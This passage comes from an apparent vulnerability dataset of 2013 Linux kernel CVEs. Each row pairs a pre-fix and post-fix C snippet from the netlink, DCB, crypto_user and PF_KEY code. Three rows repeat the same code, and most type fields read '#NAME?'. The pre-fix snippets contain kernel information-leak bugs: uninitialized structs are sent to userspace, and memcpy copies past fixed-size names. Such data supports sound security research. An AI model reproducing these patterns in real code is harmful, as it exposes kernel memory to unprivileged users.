	nest = nla_nest_start(skb, MDBA_MDB);
{
 struct br_mdb_entry entry;

 memset(&entry, 0, sizeof(entry));
	entry.ifindex = port->dev->ifindex;
	entry.addr.proto = group->proto;
	entry.addr.u.ip4 = group->u.ip4;
"
2013,#NAME?,CVE-2013-2635,"			 * report anything.
 */
			ivi.spoofchk = -1;

 if (dev->netdev_ops->ndo_get_vf_config(dev, i, &ivi))
 break;
			vf_mac.vf =
","			 * report anything.
 */
			ivi.spoofchk = -1;
 memset(ivi.mac, 0, sizeof(ivi.mac));
 if (dev->netdev_ops->ndo_get_vf_config(dev, i, &ivi))
 break;
			vf_mac.vf =
"
2013,#NAME?,CVE-2013-2634," if (!netdev->dcbnl_ops->getpermhwaddr)
 return -EOPNOTSUPP;


	netdev->dcbnl_ops->getpermhwaddr(netdev, perm_addr);

 return nla_put(skb, DCB_ATTR_PERM_HWADDR, sizeof(perm_addr), perm_addr);

 if (ops->ieee_getets) {
 struct ieee_ets ets;

		err = ops->ieee_getets(netdev, &ets);
 if (!err &&
 nla_put(skb, DCB_ATTR_IEEE_ETS, sizeof(ets), &ets))

 if (ops->ieee_getmaxrate) {
 struct ieee_maxrate maxrate;

		err = ops->ieee_getmaxrate(netdev, &maxrate);
 if (!err) {
			err = nla_put(skb, DCB_ATTR_IEEE_MAXRATE,

 if (ops->ieee_getpfc) {
 struct ieee_pfc pfc;

		err = ops->ieee_getpfc(netdev, &pfc);
 if (!err &&
 nla_put(skb, DCB_ATTR_IEEE_PFC, sizeof(pfc), &pfc))
 /* get peer info if available */
 if (ops->ieee_peer_getets) {
 struct ieee_ets ets;

		err = ops->ieee_peer_getets(netdev, &ets);
 if (!err &&
 nla_put(skb, DCB_ATTR_IEEE_PEER_ETS, sizeof(ets), &ets))

 if (ops->ieee_peer_getpfc) {
 struct ieee_pfc pfc;

		err = ops->ieee_peer_getpfc(netdev, &pfc);
 if (!err &&
 nla_put(skb, DCB_ATTR_IEEE_PEER_PFC, sizeof(pfc), &pfc))
 /* peer info if available */
 if (ops->cee_peer_getpg) {
 struct cee_pg pg;

		err = ops->cee_peer_getpg(netdev, &pg);
 if (!err &&
 nla_put(skb, DCB_ATTR_CEE_PEER_PG, sizeof(pg), &pg))

 if (ops->cee_peer_getpfc) {
 struct cee_pfc pfc;

		err = ops->cee_peer_getpfc(netdev, &pfc);
 if (!err &&
 nla_put(skb, DCB_ATTR_CEE_PEER_PFC, sizeof(pfc), &pfc))
"," if (!netdev->dcbnl_ops->getpermhwaddr)
 return -EOPNOTSUPP;

 memset(perm_addr, 0, sizeof(perm_addr));
	netdev->dcbnl_ops->getpermhwaddr(netdev, perm_addr);

 return nla_put(skb, DCB_ATTR_PERM_HWADDR, sizeof(perm_addr), perm_addr);

 if (ops->ieee_getets) {
 struct ieee_ets ets;
 memset(&ets, 0, sizeof(ets));
		err = ops->ieee_getets(netdev, &ets);
 if (!err &&
 nla_put(skb, DCB_ATTR_IEEE_ETS, sizeof(ets), &ets))

 if (ops->ieee_getmaxrate) {
 struct ieee_maxrate maxrate;
 memset(&maxrate, 0, sizeof(maxrate));
		err = ops->ieee_getmaxrate(netdev, &maxrate);
 if (!err) {
			err = nla_put(skb, DCB_ATTR_IEEE_MAXRATE,

 if (ops->ieee_getpfc) {
 struct ieee_pfc pfc;
 memset(&pfc, 0, sizeof(pfc));
		err = ops->ieee_getpfc(netdev, &pfc);
 if (!err &&
 nla_put(skb, DCB_ATTR_IEEE_PFC, sizeof(pfc), &pfc))
 /* get peer info if available */
 if (ops->ieee_peer_getets) {
 struct ieee_ets ets;
 memset(&ets, 0, sizeof(ets));
		err = ops->ieee_peer_getets(netdev, &ets);
 if (!err &&
 nla_put(skb, DCB_ATTR_IEEE_PEER_ETS, sizeof(ets), &ets))

 if (ops->ieee_peer_getpfc) {
 struct ieee_pfc pfc;
 memset(&pfc, 0, sizeof(pfc));
		err = ops->ieee_peer_getpfc(netdev, &pfc);
 if (!err &&
 nla_put(skb, DCB_ATTR_IEEE_PEER_PFC, sizeof(pfc), &pfc))
 /* peer info if available */
 if (ops->cee_peer_getpg) {
 struct cee_pg pg;
 memset(&pg, 0, sizeof(pg));
		err = ops->cee_peer_getpg(netdev, &pg);
 if (!err &&
 nla_put(skb, DCB_ATTR_CEE_PEER_PG, sizeof(pg), &pg))

 if (ops->cee_peer_getpfc) {
 struct cee_pfc pfc;
 memset(&pfc, 0, sizeof(pfc));
		err = ops->cee_peer_getpfc(netdev, &pfc);
 if (!err &&
 nla_put(skb, DCB_ATTR_CEE_PEER_PFC, sizeof(pfc), &pfc))
"
2013,#NAME?,CVE-2013-2548,"{
 struct crypto_report_blkcipher rblkcipher;

 snprintf(rblkcipher.type, CRYPTO_MAX_ALG_NAME, ""%s"", ""ablkcipher"");
 snprintf(rblkcipher.geniv, CRYPTO_MAX_ALG_NAME, ""%s"",
  alg->cra_ablkcipher.geniv ?: ""<default>"");

	rblkcipher.blocksize = alg->cra_blocksize;
	rblkcipher.min_keysize = alg->cra_ablkcipher.min_keysize;
{
 struct crypto_report_blkcipher rblkcipher;

 snprintf(rblkcipher.type, CRYPTO_MAX_ALG_NAME, ""%s"", ""givcipher"");
 snprintf(rblkcipher.geniv, CRYPTO_MAX_ALG_NAME, ""%s"",
  alg->cra_ablkcipher.geniv ?: ""<built-in>"");

	rblkcipher.blocksize = alg->cra_blocksize;
	rblkcipher.min_keysize = alg->cra_ablkcipher.min_keysize;
 struct crypto_report_aead raead;
 struct aead_alg *aead = &alg->cra_aead;

 snprintf(raead.type, CRYPTO_MAX_ALG_NAME, ""%s"", ""aead"");
 snprintf(raead.geniv, CRYPTO_MAX_ALG_NAME, ""%s"",
		 aead->geniv ?: ""<built-in>"");

	raead.blocksize = alg->cra_blocksize;
	raead.maxauthsize = aead->maxauthsize;
 struct crypto_report_aead raead;
 struct aead_alg *aead = &alg->cra_aead;

 snprintf(raead.type, CRYPTO_MAX_ALG_NAME, ""%s"", ""nivaead"");
 snprintf(raead.geniv, CRYPTO_MAX_ALG_NAME, ""%s"", aead->geniv);

	raead.blocksize = alg->cra_blocksize;
	raead.maxauthsize = aead->maxauthsize;
{
 struct crypto_report_hash rhash;

 snprintf(rhash.type, CRYPTO_MAX_ALG_NAME, ""%s"", ""ahash"");

	rhash.blocksize = alg->cra_blocksize;
	rhash.digestsize = __crypto_hash_alg_common(alg)->digestsize;
{
 struct crypto_report_blkcipher rblkcipher;

 snprintf(rblkcipher.type, CRYPTO_MAX_ALG_NAME, ""%s"", ""blkcipher"");
 snprintf(rblkcipher.geniv, CRYPTO_MAX_ALG_NAME, ""%s"",
  alg->cra_blkcipher.geniv ?: ""<default>"");

	rblkcipher.blocksize = alg->cra_blocksize;
	rblkcipher.min_keysize = alg->cra_blkcipher.min_keysize;
{
 struct crypto_report_cipher rcipher;

 snprintf(rcipher.type, CRYPTO_MAX_ALG_NAME, ""%s"", ""cipher"");

	rcipher.blocksize = alg->cra_blocksize;
	rcipher.min_keysize = alg->cra_cipher.cia_min_keysize;
{
 struct crypto_report_comp rcomp;

 snprintf(rcomp.type, CRYPTO_MAX_ALG_NAME, ""%s"", ""compression"");

 if (nla_put(skb, CRYPTOCFGA_REPORT_COMPRESS,
 sizeof(struct crypto_report_comp), &rcomp))
 goto nla_put_failure;
static int crypto_report_one(struct crypto_alg *alg,
 struct crypto_user_alg *ualg, struct sk_buff *skb)
{
 memcpy(&ualg->cru_name, &alg->cra_name, sizeof(ualg->cru_name));
 memcpy(&ualg->cru_driver_name, &alg->cra_driver_name,
 sizeof(ualg->cru_driver_name));
 memcpy(&ualg->cru_module_name, module_name(alg->cra_module),
	       CRYPTO_MAX_ALG_NAME);



	ualg->cru_flags = alg->cra_flags;
	ualg->cru_refcnt = atomic_read(&alg->cra_refcnt);

 if (alg->cra_flags & CRYPTO_ALG_LARVAL) {
 struct crypto_report_larval rl;

 snprintf(rl.type, CRYPTO_MAX_ALG_NAME, ""%s"", ""larval"");

 if (nla_put(skb, CRYPTOCFGA_REPORT_LARVAL,
 sizeof(struct crypto_report_larval), &rl))
 goto nla_put_failure;
{
 struct crypto_report_comp rpcomp;

 snprintf(rpcomp.type, CRYPTO_MAX_ALG_NAME, ""%s"", ""pcomp"");

 if (nla_put(skb, CRYPTOCFGA_REPORT_COMPRESS,
 sizeof(struct crypto_report_comp), &rpcomp))
 goto nla_put_failure;
{
 struct crypto_report_rng rrng;

 snprintf(rrng.type, CRYPTO_MAX_ALG_NAME, ""%s"", ""rng"");

	rrng.seedsize = alg->cra_rng.seedsize;

 struct crypto_report_hash rhash;
 struct shash_alg *salg = __crypto_shash_alg(alg);

 snprintf(rhash.type, CRYPTO_MAX_ALG_NAME, ""%s"", ""shash"");

	rhash.blocksize = alg->cra_blocksize;
	rhash.digestsize = salg->digestsize;

","{
 struct crypto_report_blkcipher rblkcipher;

 strncpy(rblkcipher.type, ""ablkcipher"", sizeof(rblkcipher.type));
 strncpy(rblkcipher.geniv, alg->cra_ablkcipher.geniv ?: ""<default>"",
 sizeof(rblkcipher.geniv));

	rblkcipher.blocksize = alg->cra_blocksize;
	rblkcipher.min_keysize = alg->cra_ablkcipher.min_keysize;
{
 struct crypto_report_blkcipher rblkcipher;

 strncpy(rblkcipher.type, ""givcipher"", sizeof(rblkcipher.type));
 strncpy(rblkcipher.geniv, alg->cra_ablkcipher.geniv ?: ""<built-in>"",
 sizeof(rblkcipher.geniv));

	rblkcipher.blocksize = alg->cra_blocksize;
	rblkcipher.min_keysize = alg->cra_ablkcipher.min_keysize;
 struct crypto_report_aead raead;
 struct aead_alg *aead = &alg->cra_aead;

 strncpy(raead.type, ""aead"", sizeof(raead.type));
 strncpy(raead.geniv, aead->geniv ?: ""<built-in>"", sizeof(raead.geniv));


	raead.blocksize = alg->cra_blocksize;
	raead.maxauthsize = aead->maxauthsize;
 struct crypto_report_aead raead;
 struct aead_alg *aead = &alg->cra_aead;

 strncpy(raead.type, ""nivaead"", sizeof(raead.type));
 strncpy(raead.geniv, aead->geniv, sizeof(raead.geniv));

	raead.blocksize = alg->cra_blocksize;
	raead.maxauthsize = aead->maxauthsize;
{
 struct crypto_report_hash rhash;

 strncpy(rhash.type, ""ahash"", sizeof(rhash.type));

	rhash.blocksize = alg->cra_blocksize;
	rhash.digestsize = __crypto_hash_alg_common(alg)->digestsize;
{
 struct crypto_report_blkcipher rblkcipher;

 strncpy(rblkcipher.type, ""blkcipher"", sizeof(rblkcipher.type));
 strncpy(rblkcipher.geniv, alg->cra_blkcipher.geniv ?: ""<default>"",
 sizeof(rblkcipher.geniv));

	rblkcipher.blocksize = alg->cra_blocksize;
	rblkcipher.min_keysize = alg->cra_blkcipher.min_keysize;
{
 struct crypto_report_cipher rcipher;

 strncpy(rcipher.type, ""cipher"", sizeof(rcipher.type));

	rcipher.blocksize = alg->cra_blocksize;
	rcipher.min_keysize = alg->cra_cipher.cia_min_keysize;
{
 struct crypto_report_comp rcomp;

 strncpy(rcomp.type, ""compression"", sizeof(rcomp.type));

 if (nla_put(skb, CRYPTOCFGA_REPORT_COMPRESS,
 sizeof(struct crypto_report_comp), &rcomp))
 goto nla_put_failure;
static int crypto_report_one(struct crypto_alg *alg,
 struct crypto_user_alg *ualg, struct sk_buff *skb)
{
 strncpy(ualg->cru_name, alg->cra_name, sizeof(ualg->cru_name));
 strncpy(ualg->cru_driver_name, alg->cra_driver_name,
 sizeof(ualg->cru_driver_name));
 strncpy(ualg->cru_module_name, module_name(alg->cra_module),
 sizeof(ualg->cru_module_name));

	ualg->cru_type = 0;
	ualg->cru_mask = 0;
	ualg->cru_flags = alg->cra_flags;
	ualg->cru_refcnt = atomic_read(&alg->cra_refcnt);

 if (alg->cra_flags & CRYPTO_ALG_LARVAL) {
 struct crypto_report_larval rl;

 strncpy(rl.type, ""larval"", sizeof(rl.type));

 if (nla_put(skb, CRYPTOCFGA_REPORT_LARVAL,
 sizeof(struct crypto_report_larval), &rl))
 goto nla_put_failure;
{
 struct crypto_report_comp rpcomp;

 strncpy(rpcomp.type, ""pcomp"", sizeof(rpcomp.type));

 if (nla_put(skb, CRYPTOCFGA_REPORT_COMPRESS,
 sizeof(struct crypto_report_comp), &rpcomp))
 goto nla_put_failure;
{
 struct crypto_report_rng rrng;

 strncpy(rrng.type, ""rng"", sizeof(rrng.type));

	rrng.seedsize = alg->cra_rng.seedsize;

 struct crypto_report_hash rhash;
 struct shash_alg *salg = __crypto_shash_alg(alg);

 strncpy(rhash.type, ""shash"", sizeof(rhash.type));

	rhash.blocksize = alg->cra_blocksize;
	rhash.digestsize = salg->digestsize;

"
2013,#NAME?,CVE-2013-2547,"{
 struct crypto_report_blkcipher rblkcipher;

 snprintf(rblkcipher.type, CRYPTO_MAX_ALG_NAME, ""%s"", ""ablkcipher"");
 snprintf(rblkcipher.geniv, CRYPTO_MAX_ALG_NAME, ""%s"",
  alg->cra_ablkcipher.geniv ?: ""<default>"");

	rblkcipher.blocksize = alg->cra_blocksize;
	rblkcipher.min_keysize = alg->cra_ablkcipher.min_keysize;
{
 struct crypto_report_blkcipher rblkcipher;

 snprintf(rblkcipher.type, CRYPTO_MAX_ALG_NAME, ""%s"", ""givcipher"");
 snprintf(rblkcipher.geniv, CRYPTO_MAX_ALG_NAME, ""%s"",
  alg->cra_ablkcipher.geniv ?: ""<built-in>"");

	rblkcipher.blocksize = alg->cra_blocksize;
	rblkcipher.min_keysize = alg->cra_ablkcipher.min_keysize;
 struct crypto_report_aead raead;
 struct aead_alg *aead = &alg->cra_aead;

 snprintf(raead.type, CRYPTO_MAX_ALG_NAME, ""%s"", ""aead"");
 snprintf(raead.geniv, CRYPTO_MAX_ALG_NAME, ""%s"",
		 aead->geniv ?: ""<built-in>"");

	raead.blocksize = alg->cra_blocksize;
	raead.maxauthsize = aead->maxauthsize;
 struct crypto_report_aead raead;
 struct aead_alg *aead = &alg->cra_aead;

 snprintf(raead.type, CRYPTO_MAX_ALG_NAME, ""%s"", ""nivaead"");
 snprintf(raead.geniv, CRYPTO_MAX_ALG_NAME, ""%s"", aead->geniv);

	raead.blocksize = alg->cra_blocksize;
	raead.maxauthsize = aead->maxauthsize;
{
 struct crypto_report_hash rhash;

 snprintf(rhash.type, CRYPTO_MAX_ALG_NAME, ""%s"", ""ahash"");

	rhash.blocksize = alg->cra_blocksize;
	rhash.digestsize = __crypto_hash_alg_common(alg)->digestsize;
{
 struct crypto_report_blkcipher rblkcipher;

 snprintf(rblkcipher.type, CRYPTO_MAX_ALG_NAME, ""%s"", ""blkcipher"");
 snprintf(rblkcipher.geniv, CRYPTO_MAX_ALG_NAME, ""%s"",
  alg->cra_blkcipher.geniv ?: ""<default>"");

	rblkcipher.blocksize = alg->cra_blocksize;
	rblkcipher.min_keysize = alg->cra_blkcipher.min_keysize;
{
 struct crypto_report_cipher rcipher;

 snprintf(rcipher.type, CRYPTO_MAX_ALG_NAME, ""%s"", ""cipher"");

	rcipher.blocksize = alg->cra_blocksize;
	rcipher.min_keysize = alg->cra_cipher.cia_min_keysize;
{
 struct crypto_report_comp rcomp;

 snprintf(rcomp.type, CRYPTO_MAX_ALG_NAME, ""%s"", ""compression"");

 if (nla_put(skb, CRYPTOCFGA_REPORT_COMPRESS,
 sizeof(struct crypto_report_comp), &rcomp))
 goto nla_put_failure;
static int crypto_report_one(struct crypto_alg *alg,
 struct crypto_user_alg *ualg, struct sk_buff *skb)
{
 memcpy(&ualg->cru_name, &alg->cra_name, sizeof(ualg->cru_name));
 memcpy(&ualg->cru_driver_name, &alg->cra_driver_name,
 sizeof(ualg->cru_driver_name));
 memcpy(&ualg->cru_module_name, module_name(alg->cra_module),
	       CRYPTO_MAX_ALG_NAME);



	ualg->cru_flags = alg->cra_flags;
	ualg->cru_refcnt = atomic_read(&alg->cra_refcnt);

 if (alg->cra_flags & CRYPTO_ALG_LARVAL) {
 struct crypto_report_larval rl;

 snprintf(rl.type, CRYPTO_MAX_ALG_NAME, ""%s"", ""larval"");

 if (nla_put(skb, CRYPTOCFGA_REPORT_LARVAL,
 sizeof(struct crypto_report_larval), &rl))
 goto nla_put_failure;
{
 struct crypto_report_comp rpcomp;

 snprintf(rpcomp.type, CRYPTO_MAX_ALG_NAME, ""%s"", ""pcomp"");

 if (nla_put(skb, CRYPTOCFGA_REPORT_COMPRESS,
 sizeof(struct crypto_report_comp), &rpcomp))
 goto nla_put_failure;
{
 struct crypto_report_rng rrng;

 snprintf(rrng.type, CRYPTO_MAX_ALG_NAME, ""%s"", ""rng"");

	rrng.seedsize = alg->cra_rng.seedsize;

 struct crypto_report_hash rhash;
 struct shash_alg *salg = __crypto_shash_alg(alg);

 snprintf(rhash.type, CRYPTO_MAX_ALG_NAME, ""%s"", ""shash"");

	rhash.blocksize = alg->cra_blocksize;
	rhash.digestsize = salg->digestsize;

","{
 struct crypto_report_blkcipher rblkcipher;

 strncpy(rblkcipher.type, ""ablkcipher"", sizeof(rblkcipher.type));
 strncpy(rblkcipher.geniv, alg->cra_ablkcipher.geniv ?: ""<default>"",
 sizeof(rblkcipher.geniv));

	rblkcipher.blocksize = alg->cra_blocksize;
	rblkcipher.min_keysize = alg->cra_ablkcipher.min_keysize;
{
 struct crypto_report_blkcipher rblkcipher;

 strncpy(rblkcipher.type, ""givcipher"", sizeof(rblkcipher.type));
 strncpy(rblkcipher.geniv, alg->cra_ablkcipher.geniv ?: ""<built-in>"",
 sizeof(rblkcipher.geniv));

	rblkcipher.blocksize = alg->cra_blocksize;
	rblkcipher.min_keysize = alg->cra_ablkcipher.min_keysize;
 struct crypto_report_aead raead;
 struct aead_alg *aead = &alg->cra_aead;

 strncpy(raead.type, ""aead"", sizeof(raead.type));
 strncpy(raead.geniv, aead->geniv ?: ""<built-in>"", sizeof(raead.geniv));


	raead.blocksize = alg->cra_blocksize;
	raead.maxauthsize = aead->maxauthsize;
 struct crypto_report_aead raead;
 struct aead_alg *aead = &alg->cra_aead;

 strncpy(raead.type, ""nivaead"", sizeof(raead.type));
 strncpy(raead.geniv, aead->geniv, sizeof(raead.geniv));

	raead.blocksize = alg->cra_blocksize;
	raead.maxauthsize = aead->maxauthsize;
{
 struct crypto_report_hash rhash;

 strncpy(rhash.type, ""ahash"", sizeof(rhash.type));

	rhash.blocksize = alg->cra_blocksize;
	rhash.digestsize = __crypto_hash_alg_common(alg)->digestsize;
{
 struct crypto_report_blkcipher rblkcipher;

 strncpy(rblkcipher.type, ""blkcipher"", sizeof(rblkcipher.type));
 strncpy(rblkcipher.geniv, alg->cra_blkcipher.geniv ?: ""<default>"",
 sizeof(rblkcipher.geniv));

	rblkcipher.blocksize = alg->cra_blocksize;
	rblkcipher.min_keysize = alg->cra_blkcipher.min_keysize;
{
 struct crypto_report_cipher rcipher;

 strncpy(rcipher.type, ""cipher"", sizeof(rcipher.type));

	rcipher.blocksize = alg->cra_blocksize;
	rcipher.min_keysize = alg->cra_cipher.cia_min_keysize;
{
 struct crypto_report_comp rcomp;

 strncpy(rcomp.type, ""compression"", sizeof(rcomp.type));

 if (nla_put(skb, CRYPTOCFGA_REPORT_COMPRESS,
 sizeof(struct crypto_report_comp), &rcomp))
 goto nla_put_failure;
static int crypto_report_one(struct crypto_alg *alg,
 struct crypto_user_alg *ualg, struct sk_buff *skb)
{
 strncpy(ualg->cru_name, alg->cra_name, sizeof(ualg->cru_name));
 strncpy(ualg->cru_driver_name, alg->cra_driver_name,
 sizeof(ualg->cru_driver_name));
 strncpy(ualg->cru_module_name, module_name(alg->cra_module),
 sizeof(ualg->cru_module_name));

	ualg->cru_type = 0;
	ualg->cru_mask = 0;
	ualg->cru_flags = alg->cra_flags;
	ualg->cru_refcnt = atomic_read(&alg->cra_refcnt);

 if (alg->cra_flags & CRYPTO_ALG_LARVAL) {
 struct crypto_report_larval rl;

 strncpy(rl.type, ""larval"", sizeof(rl.type));

 if (nla_put(skb, CRYPTOCFGA_REPORT_LARVAL,
 sizeof(struct crypto_report_larval), &rl))
 goto nla_put_failure;
{
 struct crypto_report_comp rpcomp;

 strncpy(rpcomp.type, ""pcomp"", sizeof(rpcomp.type));

 if (nla_put(skb, CRYPTOCFGA_REPORT_COMPRESS,
 sizeof(struct crypto_report_comp), &rpcomp))
 goto nla_put_failure;
{
 struct crypto_report_rng rrng;

 strncpy(rrng.type, ""rng"", sizeof(rrng.type));

	rrng.seedsize = alg->cra_rng.seedsize;

 struct crypto_report_hash rhash;
 struct shash_alg *salg = __crypto_shash_alg(alg);

 strncpy(rhash.type, ""shash"", sizeof(rhash.type));

	rhash.blocksize = alg->cra_blocksize;
	rhash.digestsize = salg->digestsize;

"
2013,#NAME?,CVE-2013-2546,"{
 struct crypto_report_blkcipher rblkcipher;

 snprintf(rblkcipher.type, CRYPTO_MAX_ALG_NAME, ""%s"", ""ablkcipher"");
 snprintf(rblkcipher.geniv, CRYPTO_MAX_ALG_NAME, ""%s"",
  alg->cra_ablkcipher.geniv ?: ""<default>"");

	rblkcipher.blocksize = alg->cra_blocksize;
	rblkcipher.min_keysize = alg->cra_ablkcipher.min_keysize;
{
 struct crypto_report_blkcipher rblkcipher;

 snprintf(rblkcipher.type, CRYPTO_MAX_ALG_NAME, ""%s"", ""givcipher"");
 snprintf(rblkcipher.geniv, CRYPTO_MAX_ALG_NAME, ""%s"",
  alg->cra_ablkcipher.geniv ?: ""<built-in>"");

	rblkcipher.blocksize = alg->cra_blocksize;
	rblkcipher.min_keysize = alg->cra_ablkcipher.min_keysize;
 struct crypto_report_aead raead;
 struct aead_alg *aead = &alg->cra_aead;

 snprintf(raead.type, CRYPTO_MAX_ALG_NAME, ""%s"", ""aead"");
 snprintf(raead.geniv, CRYPTO_MAX_ALG_NAME, ""%s"",
		 aead->geniv ?: ""<built-in>"");

	raead.blocksize = alg->cra_blocksize;
	raead.maxauthsize = aead->maxauthsize;
 struct crypto_report_aead raead;
 struct aead_alg *aead = &alg->cra_aead;

 snprintf(raead.type, CRYPTO_MAX_ALG_NAME, ""%s"", ""nivaead"");
 snprintf(raead.geniv, CRYPTO_MAX_ALG_NAME, ""%s"", aead->geniv);

	raead.blocksize = alg->cra_blocksize;
	raead.maxauthsize = aead->maxauthsize;
{
 struct crypto_report_hash rhash;

 snprintf(rhash.type, CRYPTO_MAX_ALG_NAME, ""%s"", ""ahash"");

	rhash.blocksize = alg->cra_blocksize;
	rhash.digestsize = __crypto_hash_alg_common(alg)->digestsize;
{
 struct crypto_report_blkcipher rblkcipher;

 snprintf(rblkcipher.type, CRYPTO_MAX_ALG_NAME, ""%s"", ""blkcipher"");
 snprintf(rblkcipher.geniv, CRYPTO_MAX_ALG_NAME, ""%s"",
  alg->cra_blkcipher.geniv ?: ""<default>"");

	rblkcipher.blocksize = alg->cra_blocksize;
	rblkcipher.min_keysize = alg->cra_blkcipher.min_keysize;
{
 struct crypto_report_cipher rcipher;

 snprintf(rcipher.type, CRYPTO_MAX_ALG_NAME, ""%s"", ""cipher"");

	rcipher.blocksize = alg->cra_blocksize;
	rcipher.min_keysize = alg->cra_cipher.cia_min_keysize;
{
 struct crypto_report_comp rcomp;

 snprintf(rcomp.type, CRYPTO_MAX_ALG_NAME, ""%s"", ""compression"");

 if (nla_put(skb, CRYPTOCFGA_REPORT_COMPRESS,
 sizeof(struct crypto_report_comp), &rcomp))
 goto nla_put_failure;
static int crypto_report_one(struct crypto_alg *alg,
 struct crypto_user_alg *ualg, struct sk_buff *skb)
{
 memcpy(&ualg->cru_name, &alg->cra_name, sizeof(ualg->cru_name));
 memcpy(&ualg->cru_driver_name, &alg->cra_driver_name,
 sizeof(ualg->cru_driver_name));
 memcpy(&ualg->cru_module_name, module_name(alg->cra_module),
	       CRYPTO_MAX_ALG_NAME);



	ualg->cru_flags = alg->cra_flags;
	ualg->cru_refcnt = atomic_read(&alg->cra_refcnt);

 if (alg->cra_flags & CRYPTO_ALG_LARVAL) {
 struct crypto_report_larval rl;

 snprintf(rl.type, CRYPTO_MAX_ALG_NAME, ""%s"", ""larval"");

 if (nla_put(skb, CRYPTOCFGA_REPORT_LARVAL,
 sizeof(struct crypto_report_larval), &rl))
 goto nla_put_failure;
{
 struct crypto_report_comp rpcomp;

 snprintf(rpcomp.type, CRYPTO_MAX_ALG_NAME, ""%s"", ""pcomp"");

 if (nla_put(skb, CRYPTOCFGA_REPORT_COMPRESS,
 sizeof(struct crypto_report_comp), &rpcomp))
 goto nla_put_failure;
{
 struct crypto_report_rng rrng;

 snprintf(rrng.type, CRYPTO_MAX_ALG_NAME, ""%s"", ""rng"");

	rrng.seedsize = alg->cra_rng.seedsize;

 struct crypto_report_hash rhash;
 struct shash_alg *salg = __crypto_shash_alg(alg);

 snprintf(rhash.type, CRYPTO_MAX_ALG_NAME, ""%s"", ""shash"");

	rhash.blocksize = alg->cra_blocksize;
	rhash.digestsize = salg->digestsize;

","{
 struct crypto_report_blkcipher rblkcipher;

 strncpy(rblkcipher.type, ""ablkcipher"", sizeof(rblkcipher.type));
 strncpy(rblkcipher.geniv, alg->cra_ablkcipher.geniv ?: ""<default>"",
 sizeof(rblkcipher.geniv));

	rblkcipher.blocksize = alg->cra_blocksize;
	rblkcipher.min_keysize = alg->cra_ablkcipher.min_keysize;
{
 struct crypto_report_blkcipher rblkcipher;

 strncpy(rblkcipher.type, ""givcipher"", sizeof(rblkcipher.type));
 strncpy(rblkcipher.geniv, alg->cra_ablkcipher.geniv ?: ""<built-in>"",
 sizeof(rblkcipher.geniv));

	rblkcipher.blocksize = alg->cra_blocksize;
	rblkcipher.min_keysize = alg->cra_ablkcipher.min_keysize;
 struct crypto_report_aead raead;
 struct aead_alg *aead = &alg->cra_aead;

 strncpy(raead.type, ""aead"", sizeof(raead.type));
 strncpy(raead.geniv, aead->geniv ?: ""<built-in>"", sizeof(raead.geniv));


	raead.blocksize = alg->cra_blocksize;
	raead.maxauthsize = aead->maxauthsize;
 struct crypto_report_aead raead;
 struct aead_alg *aead = &alg->cra_aead;

 strncpy(raead.type, ""nivaead"", sizeof(raead.type));
 strncpy(raead.geniv, aead->geniv, sizeof(raead.geniv));

	raead.blocksize = alg->cra_blocksize;
	raead.maxauthsize = aead->maxauthsize;
{
 struct crypto_report_hash rhash;

 strncpy(rhash.type, ""ahash"", sizeof(rhash.type));

	rhash.blocksize = alg->cra_blocksize;
	rhash.digestsize = __crypto_hash_alg_common(alg)->digestsize;
{
 struct crypto_report_blkcipher rblkcipher;

 strncpy(rblkcipher.type, ""blkcipher"", sizeof(rblkcipher.type));
 strncpy(rblkcipher.geniv, alg->cra_blkcipher.geniv ?: ""<default>"",
 sizeof(rblkcipher.geniv));

	rblkcipher.blocksize = alg->cra_blocksize;
	rblkcipher.min_keysize = alg->cra_blkcipher.min_keysize;
{
 struct crypto_report_cipher rcipher;

 strncpy(rcipher.type, ""cipher"", sizeof(rcipher.type));

	rcipher.blocksize = alg->cra_blocksize;
	rcipher.min_keysize = alg->cra_cipher.cia_min_keysize;
{
 struct crypto_report_comp rcomp;

 strncpy(rcomp.type, ""compression"", sizeof(rcomp.type));

 if (nla_put(skb, CRYPTOCFGA_REPORT_COMPRESS,
 sizeof(struct crypto_report_comp), &rcomp))
 goto nla_put_failure;
static int crypto_report_one(struct crypto_alg *alg,
 struct crypto_user_alg *ualg, struct sk_buff *skb)
{
 strncpy(ualg->cru_name, alg->cra_name, sizeof(ualg->cru_name));
 strncpy(ualg->cru_driver_name, alg->cra_driver_name,
 sizeof(ualg->cru_driver_name));
 strncpy(ualg->cru_module_name, module_name(alg->cra_module),
 sizeof(ualg->cru_module_name));

	ualg->cru_type = 0;
	ualg->cru_mask = 0;
	ualg->cru_flags = alg->cra_flags;
	ualg->cru_refcnt = atomic_read(&alg->cra_refcnt);

 if (alg->cra_flags & CRYPTO_ALG_LARVAL) {
 struct crypto_report_larval rl;

 strncpy(rl.type, ""larval"", sizeof(rl.type));

 if (nla_put(skb, CRYPTOCFGA_REPORT_LARVAL,
 sizeof(struct crypto_report_larval), &rl))
 goto nla_put_failure;
{
 struct crypto_report_comp rpcomp;

 strncpy(rpcomp.type, ""pcomp"", sizeof(rpcomp.type));

 if (nla_put(skb, CRYPTOCFGA_REPORT_COMPRESS,
 sizeof(struct crypto_report_comp), &rpcomp))
 goto nla_put_failure;
{
 struct crypto_report_rng rrng;

 strncpy(rrng.type, ""rng"", sizeof(rrng.type));

	rrng.seedsize = alg->cra_rng.seedsize;

 struct crypto_report_hash rhash;
 struct shash_alg *salg = __crypto_shash_alg(alg);

 strncpy(rhash.type, ""shash"", sizeof(rhash.type));

	rhash.blocksize = alg->cra_blocksize;
	rhash.digestsize = salg->digestsize;

"
2013,Overflow +Info ,CVE-2013-2237,"	hdr->sadb_msg_pid = c->portid;
	hdr->sadb_msg_version = PF_KEY_V2;
	hdr->sadb_msg_errno = (uint8_t) 0;

	hdr->sadb_msg_len = (sizeof(struct sadb_msg) / sizeof(uint64_t));
 pfkey_broadcast(skb_out, GFP_ATOMIC, BROADCAST_ALL, NULL, c->net);
 return 0;
","	hdr->sadb_msg_pid = c->portid;
	hdr->sadb_msg_version = PF_KEY_V2;
	hdr->sadb_msg_errno = (uint8_t) 0;
	hdr->sadb_msg_satype = SADB_SATYPE_UNSPEC;
	hdr->sadb_msg_len = (sizeof(struct sadb_msg) / sizeof(uint64_t));
 pfkey_broadcast(skb_out, GFP_ATOMIC, BROADCAST_ALL, NULL, c->net);
 return 0;
"
2013,Overflow +Info ,CVE-2013-2234,"	hdr->sadb_msg_version = PF_KEY_V2;
	hdr->sadb_msg_errno = (uint8_t) 0;
	hdr->sadb_msg_len = (sizeof(struct sadb_msg) / sizeof(uint64_t));


 pfkey_broadcast(skb, GFP_ATOMIC, BROADCAST_ALL, NULL, c->net);

